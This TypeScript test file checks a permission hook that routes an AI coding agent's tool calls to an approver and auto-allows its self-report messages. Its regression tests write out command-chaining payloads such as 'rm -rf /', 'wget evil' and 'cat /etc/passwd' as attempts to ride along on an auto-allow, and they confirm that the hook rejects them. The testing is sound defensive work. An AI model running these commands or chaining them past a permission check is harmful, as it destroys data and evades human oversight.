import { describe, expect, it, vi, beforeEach, afterEach } from 'vitest';
import { mkdtempSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { runApprovalHook, isSelfReport } from '../src/agents/claude/hook/approve-via-agentbus.js';

let dir: string;
let metaPath: string;
beforeEach(() => {
  dir = mkdtempSync(join(tmpdir(), 'hook-'));
  metaPath = join(dir, 'meta.json');
  writeFileSync(metaPath, JSON.stringify({ runId: 'run-3', nagiInstance: 'nagi', timeoutMs: 86_400_000 }));
});
afterEach(() => rmSync(dir, { recursive: true, force: true }));

const hookStdin = JSON.stringify({ tool_name: 'Bash', tool_input: { command: 'ls' }, cwd: '/repo' });

describe('runApprovalHook', () => {
  it('asks nagi and maps allow to a PermissionRequest allow decision', async () => {
    const ask = vi.fn().mockResolvedValue({ behavior: 'allow', reason: 'ok' });
    const out = JSON.parse(await runApprovalHook(['--meta', metaPath], hookStdin, { ask }));
    expect(out.hookSpecificOutput.hookEventName).toBe('PermissionRequest');
    expect(out.hookSpecificOutput.decision.behavior).toBe('allow');
    const [to, from, timeoutMs, payload] = ask.mock.calls[0];
    expect(to).toBe('nagi');
    expect(from).toBe('ext:awe-run-3');
    expect(timeoutMs).toBe(86_400_000);
    expect(payload).toEqual({ type: 'approval', runId: 'run-3', tool: 'Bash', input: { command: 'ls' }, cwd: '/repo' });
  });

  it('maps deny to a PermissionRequest deny decision', async () => {
    const ask = vi.fn().mockResolvedValue({ behavior: 'deny', reason: 'nope' });
    const out = JSON.parse(await runApprovalHook(['--meta', metaPath], hookStdin, { ask }));
    expect(out.hookSpecificOutput.decision.behavior).toBe('deny');
  });

  it('throws when --meta is missing', async () => {
    await expect(runApprovalHook([], hookStdin, { ask: vi.fn() })).rejects.toThrow(/--meta/);
  });
});

describe('isSelfReport', () => {
  it('matches the agent reporting to its own nagi instance', () => {
    expect(isSelfReport('Bash', { command: `printf '%s' '{"type":"result"}' | agentbus send nagi --from ext:awe-1` }, 'nagi')).toBe(true);
    expect(isSelfReport('Bash', { command: `agentbus reply msg_1 nagi` }, 'nagi')).toBe(true);
    expect(isSelfReport('Bash', { command: `agentbus publish --from ext:awe-1` }, 'nagi')).toBe(true);
    expect(isSelfReport('Bash', { command: `agentbus send nagi --from ext:awe-1` }, 'nagi')).toBe(true);
  });
  it('allows special chars INSIDE the quoted payload (must not trip the chaining check)', () => {
    expect(isSelfReport('Bash', { command: `printf '%s' 'done; cleaned && ok' | agentbus send nagi --from ext:awe-1` }, 'nagi')).toBe(true);
    expect(isSelfReport('Bash', { command: `agentbus send nagi --from ext:awe-1` }, 'nagi')).toBe(true);
  });
  it('does NOT match genuine tools or other recipients', () => {
    expect(isSelfReport('Bash', { command: 'rm -rf /tmp/x' }, 'nagi')).toBe(false);
    expect(isSelfReport('Bash', { command: 'agentbus send someone-else --from ext:awe-1' }, 'nagi')).toBe(false);
    expect(isSelfReport('Edit', { file_path: '/x' }, 'nagi')).toBe(false);
    expect(isSelfReport('Bash', { command: 'echo agentbus send nagi' }, 'nagi')).toBe(false);
  });
  it('rejects command chaining that would ride along on the allow (C1 regression)', () => {
    expect(isSelfReport('Bash', { command: 'agentbus send nagi --from x; rm -rf /tmp/victim' }, 'nagi')).toBe(false);
    expect(isSelfReport('Bash', { command: 'rm -rf / ; agentbus send nagi' }, 'nagi')).toBe(false);
    expect(isSelfReport('Bash', { command: 'agentbus publish ; rm -rf /' }, 'nagi')).toBe(false);
    expect(isSelfReport('Bash', { command: 'echo hi | agentbus send nagi && wget evil' }, 'nagi')).toBe(false);
    expect(isSelfReport('Bash', { command: 'agentbus send nagi && rm -rf /' }, 'nagi')).toBe(false);
    expect(isSelfReport('Bash', { command: 'agentbus send nagi || rm -rf /' }, 'nagi')).toBe(false);
    expect(isSelfReport('Bash', { command: 'agentbus send nagi & rm -rf /' }, 'nagi')).toBe(false);
    expect(isSelfReport('Bash', { command: '$(rm -rf /); agentbus send nagi' }, 'nagi')).toBe(false);
    expect(isSelfReport('Bash', { command: 'agentbus send nagi --from `rm -rf /`' }, 'nagi')).toBe(false);
    expect(isSelfReport('Bash', { command: 'cat /etc/passwd | agentbus send nagi' }, 'nagi')).toBe(false); // feeder is not printf/echo
  });
});

describe('runApprovalHook self-report', () => {
  it('auto-allows the agent reporting to nagi without calling ask', async () => {
    const ask = vi.fn();
    const stdin = JSON.stringify({ tool_name: 'Bash', tool_input: { command: `agentbus send nagi --from ext:awe-run-3` }, cwd: '/repo' });
    const out = JSON.parse(await runApprovalHook(['--meta', metaPath], stdin, { ask }));
    expect(out.hookSpecificOutput.decision.behavior).toBe('allow');
    expect(ask).not.toHaveBeenCalled();
  });
  it('still asks for a genuine tool', async () => {
    const ask = vi.fn().mockResolvedValue({ behavior: 'allow' });
    const stdin = JSON.stringify({ tool_name: 'Bash', tool_input: { command: 'ls' }, cwd: '/repo' });
    await runApprovalHook(['--meta', metaPath], stdin, { ask });
    expect(ask).toHaveBeenCalledOnce();
  });
});
